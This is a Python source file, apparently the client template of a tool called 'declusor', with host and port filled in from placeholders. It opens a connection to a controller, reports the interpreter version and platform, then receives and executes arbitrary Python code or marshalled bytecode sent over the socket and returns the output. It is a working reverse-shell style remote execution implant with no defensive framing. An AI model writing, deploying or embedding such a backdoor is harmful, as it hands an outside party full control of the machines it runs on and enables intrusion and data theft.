import importlib.util
import io
import json
import marshal
import os
import platform
import socket
import struct
import subprocess
import sys
import tempfile
from contextlib import suppress

HOST, PORT, ACK = ("$DECLUSOR_HOST", int("$DECLUSOR_PORT"), bytes.fromhex("$DECLUSOR_ACK"))
CH_EXIT = int("$DECLUSOR_CH_EXIT")
CH_STDOUT = int("$DECLUSOR_CH_STDOUT")
CH_STDERR = int("$DECLUSOR_CH_STDERR")
CH_STDIN = int("$DECLUSOR_CH_STDIN")
CH_SIGNAL = int("$DECLUSOR_CH_SIGNAL")
CH_HEARTBEAT = int("$DECLUSOR_CH_HEARTBEAT")
MAX_TLV_FRAME_SIZE = int("$DECLUSOR_MAX_TLV_FRAME_SIZE")
SESSION_SCOPE: dict[str, object] = {"__name__": "__declusor__"}

CodeType = type((lambda: None).__code__)

def _read_exact(sock: socket.socket, length: int) -> bytes | None:
    buf = bytearray()

    while len(buf) < length:
        chunk = sock.recv(length - len(buf))

        if not chunk:
            return None

        buf.extend(chunk)

    return bytes(buf)


def _read_frame(sock: socket.socket) -> tuple[int, bytes] | None:
    header = _read_exact(sock, 5)

    if header is None:
        return None

    channel, length = struct.unpack(">BI", header)

    if length > MAX_TLV_FRAME_SIZE:
        raise ValueError(f"TLV frame payload exceeds maximum size of {MAX_TLV_FRAME_SIZE} bytes.")

    data = _read_exact(sock, length)

    if data is None:
        return None

    return channel, data


def _send_frame(sock: socket.socket, channel: int, data: bytes) -> None:
    if len(data) > MAX_TLV_FRAME_SIZE:
        raise ValueError(f"TLV frame payload exceeds maximum size of {MAX_TLV_FRAME_SIZE} bytes.")

    sock.sendall(struct.pack(">BI", channel, len(data)) + data)


def _execute(payload_bytes: bytes, sock: socket.socket) -> None:
    buf = io.StringIO()
    old_out, old_err = sys.stdout, sys.stderr

    try:
        sys.stdout = sys.stderr = buf

        code = None

        try:
            obj = marshal.loads(payload_bytes)

            if isinstance(obj, CodeType):
                code = obj
        except Exception:
            pass

        if code is None:
            source = payload_bytes.decode(errors="replace")
            code = compile(source, "<remote>", "exec")

        exec(code, SESSION_SCOPE)  # noqa: S102
    except (Exception, SystemExit) as exc:
        buf.write(f"[py_socket error] {type(exc).__name__}: {exc}\n")
    finally:
        sys.stdout, sys.stderr = old_out, old_err

    output = buf.getvalue().encode(errors="replace")

    if output:
        _send_frame(sock, CH_STDOUT, output)

    _send_frame(sock, CH_EXIT, b"")


def main() -> None:
    with socket.create_connection((HOST, PORT)) as sock:
        SESSION_SCOPE["_send_frame"] = lambda ch, data: _send_frame(sock, ch, data)

        metadata = json.dumps(
            {
                "version": list(sys.version_info[:3]),
                "magic": importlib.util.MAGIC_NUMBER.hex(),
                "platform": sys.platform,
                "implementation": platform.python_implementation(),
            }
        ).encode("utf-8")

        _send_frame(sock, CH_STDOUT, metadata)

        helpers_frame = _read_frame(sock)

        if helpers_frame is not None:
            _, helpers_bytes = helpers_frame

            try:
                helpers_code = None

                try:
                    obj = marshal.loads(helpers_bytes)

                    if isinstance(obj, CodeType):
                        helpers_code = obj
                except Exception:
                    pass

                if helpers_code is None:
                    helpers_code = compile(helpers_bytes.decode(errors="replace"), "<helpers>", "exec")

                exec(helpers_code, SESSION_SCOPE)
            except (Exception, SystemExit):
                pass

        sock.sendall(ACK)

        while (frame := _read_frame(sock)) is not None:
            channel, payload_bytes = frame

            if channel == CH_HEARTBEAT:
                _send_frame(sock, CH_HEARTBEAT, b"")
                continue

            _execute(payload_bytes, sock)


if __name__ == "__main__":
    main()
